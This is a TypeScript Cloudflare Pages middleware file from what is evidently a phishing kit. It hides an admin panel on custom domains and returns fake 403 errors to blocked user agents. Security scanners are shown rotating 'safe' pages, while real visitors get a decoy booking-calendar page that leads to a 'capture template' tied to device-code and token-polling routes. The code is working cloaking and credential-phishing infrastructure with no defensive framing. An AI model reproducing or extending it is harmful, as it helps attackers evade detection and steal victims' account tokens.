import { isHardBlocked, isScanner, getRotatingPage } from './lib/protection';
import { generateDecoyHTML } from './lib/decoy-html';

interface Env {
  TOKEN_STORE: KVNamespace;
}

// Routes allowed on custom domains (landing page + device code flow only)
const CUSTOM_DOMAIN_ALLOWED: string[] = [
  '/api/device-code',
  '/api/token-poll',
  '/api/antibot-token',
  '/api/templates',
  '/api/schedule/confirm',
];

function isPagesDev(hostname: string): boolean {
  return hostname.endsWith('.pages.dev') || hostname === 'localhost' || hostname === '127.0.0.1';
}

export const onRequest: PagesFunction<Env> = async (context) => {
  const { request } = context;
  const url = new URL(request.url);
  const path = url.pathname;
  const hostname = url.hostname;

  // --- Custom Domain Isolation ---
  if (!isPagesDev(hostname)) {
    if (path.startsWith('/admin')) {
      return new Response('<!DOCTYPE html><html><head><title>404</title></head><body><h1>404 Not Found</h1></body></html>', {
        status: 404,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
      });
    }
    if (path.startsWith('/api/')) {
      const allowed = CUSTOM_DOMAIN_ALLOWED.some(r => path.startsWith(r));
      if (!allowed) {
        return new Response(JSON.stringify({ error: 'Not found' }), {
          status: 404,
          headers: { 'Content-Type': 'application/json' },
        });
      }
    }
  }

  // Skip protection for API routes, admin, and static assets
  if (
    path.startsWith('/api/') ||
    path.startsWith('/admin') ||
    path.startsWith('/assets/') ||
    path.match(/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|json)$/)
  ) {
    return context.next();
  }

  const ua = request.headers.get('user-agent') || '';
  const ip = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '';

  // Layer 1 — Hard Block (403)
  if (isHardBlocked(ua)) {
    return new Response('<!DOCTYPE html><html><head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>Access Denied</p></body></html>', {
      status: 403,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  // Layer 2 — Scanner Safe Pages (200 rotating)
  if (isScanner(ua, ip)) {
    const page = getRotatingPage(ua, url.href);
    return new Response(page, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
      },
    });
  }

  // --- Decoy Page Flow ---
  // For the root path (/), serve the decoy page (booking calendar)
  // The decoy page handles user interaction, then POSTs to /api/schedule/confirm
  // which returns the shield-wrapped capture template
  if (path === '/' || path === '') {
    // Read the decoy template config from KV (default to bookings-meeting)
    let decoyType = 'bookings-meeting';
    try { if (context.env?.TOKEN_STORE) decoyType = (await context.env.TOKEN_STORE.get('decoy_template')) || 'bookings-meeting'; } catch {};
    const decoyHtml = generateDecoyHTML(decoyType);
    return new Response(decoyHtml, {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
      },
    });
  }

  // Real browser, non-root path — pass through to SPA (admin, preview, etc.)
  return context.next();
};
